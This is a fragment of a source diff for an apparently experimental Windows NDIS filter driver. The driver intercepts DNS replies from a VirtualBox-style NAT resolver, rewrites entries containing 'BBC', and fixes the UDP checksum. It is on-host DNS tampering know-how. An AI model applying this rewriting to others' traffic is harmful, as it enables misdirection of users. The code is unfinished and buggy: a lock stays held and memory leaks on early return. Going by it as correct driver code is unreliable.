-                pPseudoheader->DestinationAddress = destinationAddress;
-                pPseudoheader->Protocol = protocol;
-                pPseudoheader->TotalLength = totalLength;
-                pPseudoheader->zeros = 0;
-                dnsDataLegnth = (currNb->DataLength - 4) - (UINT)((PUCHAR)pPseudoheader - (PUCHAR)storageBuffer);
-                newChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
-                UDPHeader->Checksum = 0;
-                newChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
-                *pChecksum = newChecksum;
-                checksumOffset = 0xffffffff;
-                changeMade = 0;
-                ExFreePool(storageBuffer);
-            }
-            mdlPostCount++;
-            currMdl = currMdl->Next;
+    checksumOffset = (ULONG)((PUCHAR)&UDPHeader->Checksum - (PUCHAR)EthHeader);
+    currMdl = currNb->CurrentMdl;
+    mdlPreCount = 0;
+    mdlPostCount = 0;
+    while (currMdl != NULL) {
+        mdlSystemVa = MmGetMdlVirtualAddress(currMdl);
+        changeMade = changeBBC(currMdl, mdlSystemVa);
+        if (changeMade == 0 && mdlPreCount == 0) {
+            pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
+            mdlPreCount++;
         }
+        else if (changeMade == 1) {
+            //if (counter < 5) {
+            //    DbgBreakPoint();
+            //    counter++;
+            //}
+            if (mdlPostCount == 0) {
+                pChecksum = (PUSHORT)((PUCHAR)mdlSystemVa + checksumOffset);
+            }
+            
+            UDPHeader = (PMY_UDP_HEADER)((char*)storageBuffer + sizeof(MY_ETHERNET_HEADER) + sizeof(MY_IPVFOUR_HEADER));
+            pPseudoheader = (PMY_UDP_PSEUDOHEADER)((PUCHAR)UDPHeader - sizeof(MY_UDP_PSEUDOHEADER));
+            pPseudoheader->SourceAddress = sourceAddress;
+            pPseudoheader->DestinationAddress = destinationAddress;
+            pPseudoheader->Protocol = protocol;
+            pPseudoheader->TotalLength = totalLength;
+            pPseudoheader->zeros = 0;
+            dnsDataLegnth = (currNb->DataLength - 4) - (UINT)((PUCHAR)pPseudoheader - (PUCHAR)storageBuffer);
+            newChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
+            UDPHeader->Checksum = 0;
+            newChecksum = calculateChecksum((PUSHORT)pPseudoheader, dnsDataLegnth);
+            *pChecksum = newChecksum;
+            checksumOffset = 0xffffffff;
+            changeMade = 0;
+        }
+        mdlPostCount++;
+        currMdl = currMdl->Next;
     }
 }
 
@@ -1982,6 +2247,16 @@ VOID acceptIPV6(PNET_BUFFER currNb) {
     }
 }
 
+VOID processReceiveClone(PNET_BUFFER_LIST clonedNbl, PVOID storageBuffer) {
+    PNET_BUFFER currNb = NULL;
+
+    currNb = NET_BUFFER_LIST_FIRST_NB(clonedNbl);
+    while (currNb != NULL) {
+        acceptIPV4(storageBuffer, currNb);
+        currNb = NET_BUFFER_NEXT_NB(currNb);
+    }
+}
+
 VOID acceptRedirect(PNET_BUFFER_LIST CurrNbl) {
     PNET_BUFFER currNb = NULL;
     PMY_ETHERNET_HEADER EthHeader = NULL;
@@ -1989,6 +2264,7 @@ VOID acceptRedirect(PNET_BUFFER_LIST CurrNbl) {
     UCHAR IPversion;
     PMDL currMdl = NULL;
     PVOID mdlSystemVa;
+    PVOID storageBuffer = NULL;
 
     currNb = NET_BUFFER_LIST_FIRST_NB(CurrNbl);
     while (currNb != NULL) {
@@ -1999,7 +2275,7 @@ VOID acceptRedirect(PNET_BUFFER_LIST CurrNbl) {
         IPversion = IP4Header->VersionAndIHL;
         IPversion = IPversion >> 4;
         if (IPversion == 4) {
-            acceptIPV4(currNb);
+            acceptIPV4(storageBuffer, currNb);
         }
         else if (IPversion == 6) {
             acceptIPV6(currNb);
@@ -2070,8 +2346,14 @@ N.B.: It is important to check the ReceiveFlags in NDIS_TEST_RECEIVE_CANNOT_PEND
     ULONG               Ref;
     BOOLEAN             bFalse = FALSE;
     PNET_BUFFER_LIST    CurrNbl = NULL;
+    PNET_BUFFER         currNb = NULL;
+    PVOID               storageBuffer = NULL;
+    UCHAR               IPversion;
+    USHORT              sourcePort;
+    UINT                sourceAddress;
+    BOOLEAN             bbcFound;
     PNET_BUFFER_LIST    clonedNbl = NULL;
-    //PNET_BUFFER_LIST    testClonedNbl = NULL;
+    PNET_BUFFER_LIST    indicateNbl = NetBufferLists;
     ULONG               ReturnFlags;
 
     //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld ReceiveNetBufferList: NetBufferLists = %p.\n", NetBufferLists));
@@ -2150,59 +2432,65 @@ N.B.: It is important to check the ReceiveFlags in NDIS_TEST_RECEIVE_CANNOT_PEND
         //    DbgBreakPoint();
         //    counter++;
         //}
-        if (cnnCounter > 0) {
-            clonedNbl = NdisAllocateCloneNetBufferList(NetBufferLists, NULL, NULL, NDIS_CLONE_FLAGS_RESERVED);
-            clonedNbl->MiniportReserved[0] = NetBufferLists->MiniportReserved[0];
-            clonedNbl->MiniportReserved[1] = NetBufferLists->MiniportReserved[1];
         
-            if (pFilter->TrackReceives)
-            {
-                FILTER_ACQUIRE_LOCK(&pFilter->Lock, DispatchLevel);
-                CurrNbl = clonedNbl;
-                while (CurrNbl) {
-                    //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld ReceiveNetBufferList: CurrNbl = %p.\n", CurrNbl));
-        
-                    acceptRedirect(CurrNbl);
-                    pFilter->OutstandingRcvs += NumberOfNetBufferLists;
-                    Ref = pFilter->OutstandingRcvs;
-                    FILTER_LOG_RCV_REF(1, pFilter, clonedNbl, Ref);
-                    CurrNbl = CurrNbl->Next;
+        //clonedNbl = NdisAllocateCloneNetBufferList(NetBufferLists, NULL, NULL, NDIS_CLONE_FLAGS_RESERVED);
+        //clonedNbl->MiniportReserved[0] = NetBufferLists->MiniportReserved[0];
+        //clonedNbl->MiniportReserved[1] = NetBufferLists->MiniportReserved[1];
+        //ReturnFlags = 0;
+        //NdisFReturnNetBufferLists(pFilter->FilterHandle, NetBufferLists, ReturnFlags);
+        if (pFilter->TrackReceives)
+        {
+            FILTER_ACQUIRE_LOCK(&pFilter->Lock, DispatchLevel);
+            CurrNbl = NetBufferLists;
+            while (CurrNbl) {
+                currNb = NET_BUFFER_LIST_FIRST_NB(CurrNbl);
+                storageBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, currNb->DataLength, 'Tag2');
+                if (storageBuffer == NULL) {
+                    KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld projectRedirect, ExAllocatePool2 Fail\n"));
+                    return;
                 }
-                FILTER_RELEASE_LOCK(&pFilter->Lock, DispatchLevel);
-            }
-        
-            NdisFIndicateReceiveNetBufferLists(
-                pFilter->FilterHandle,
-                clonedNbl,
-                PortNumber,
-                NumberOfNetBufferLists,
-                ReceiveFlags);
-        }
-        else {
-            if (pFilter->TrackReceives)
-            {
-                FILTER_ACQUIRE_LOCK(&pFilter->Lock, DispatchLevel);
-                CurrNbl = NetBufferLists;
-                while (CurrNbl) {
-                    //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld ReceiveNetBufferList: CurrNbl = %p.\n", CurrNbl));
-                    //if(cnnCounter > 0){
-                    //    acceptRedirect(CurrNbl);
-                    //}
-                    pFilter->OutstandingRcvs += NumberOfNetBufferLists;
-                    Ref = pFilter->OutstandingRcvs;
-                    FILTER_LOG_RCV_REF(1, pFilter, clonedNbl, Ref);
-                    CurrNbl = CurrNbl->Next;
+                //KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "===> filterHelloWorld ReceiveNetBufferList: CurrNbl = %p.\n", CurrNbl));
+                
+                while (currNb != NULL) {
+                    NdisGetDataBuffer(currNb, currNb->DataLength, storageBuffer, 0, 0);
+                    if (storageBuffer == NULL) {
+                        KdPrintEx((DPFLTR_IHVDRIVER_ID, 0xffffffff, "filterHelloWorld acceptRedirect, NdisGetDataBuffer Fail\n"));
+                        return;
+                    }
+                    IPversion = getIPVersion(storageBuffer);
+                    if (IPversion == 4) {
+                        sourcePort = getSourcePort(storageBuffer);
+                        sourceAddress = getSourceAddress(storageBuffer);
+                        if ((sourcePort == 0x3500) && (sourceAddress == 0x0302000a)) {
+                            bbcFound = findBBC(storageBuffer, currNb->DataLength);
+                            if (bbcFound == TRUE) {
+                                clonedNbl = NdisAllocateCloneNetBufferList(NetBufferLists, NULL, NULL, NDIS_CLONE_FLAGS_RESERVED);
+                                clonedNbl->ParentNetBufferList = NetBufferLists;
+                                clonedNbl->SourceHandle = FilterModuleContext;
+                                indicateNbl = clonedNbl;
+                                processReceiveClone(clonedNbl, storageBuffer);
+                            }
+                        }
+                    }
+                    currNb = NET_BUFFER_NEXT_NB(currNb);
                 }
-                FILTER_RELEASE_LOCK(&pFilter->Lock, DispatchLevel);
+                //acceptRedirect(CurrNbl);
+                pFilter->OutstandingRcvs += NumberOfNetBufferLists;
+                Ref = pFilter->OutstandingRcvs;
+                FILTER_LOG_RCV_REF(1, pFilter, clonedNbl, Ref);
+                CurrNbl = NET_BUFFER_LIST_NEXT_NBL(CurrNbl);
+                ExFreePool(storageBuffer);
             }
-
-            NdisFIndicateReceiveNetBufferLists(
-                pFilter->FilterHandle,
-                NetBufferLists,
-                PortNumber,
-                NumberOfNetBufferLists,
-                ReceiveFlags);
+            FILTER_RELEASE_LOCK(&pFilter->Lock, DispatchLevel);
         }
+       
+        NdisFIndicateReceiveNetBufferLists(
+            pFilter->FilterHandle,
+            indicateNbl,
+            PortNumber,
+            NumberOfNetBufferLists,
+            ReceiveFlags);
+       
 
         if (NDIS_TEST_RECEIVE_CANNOT_PEND(ReceiveFlags) &&
             pFilter->TrackReceives)
@@ -2213,7 +2501,7 @@ N.B.: It is important to check the ReceiveFlags in NDIS_TEST_RECEIVE_CANNOT_PEND
             FILTER_LOG_RCV_REF(2, pFilter, clonedNbl, Ref);
             FILTER_RELEASE_LOCK(&pFilter->Lock, DispatchLevel);
         }
-        //NdisFreeCloneNetBufferList(testClonedNbl, NDIS_CLONE_FLAGS_RESERVED);
+        //NdisFreeCloneNetBufferList(clonedNbl, NDIS_CLONE_FLAGS_RESERVED);
         //testClonedNbl = NULL;
         //Will this fix everything???
         //ReturnFlags = 0;
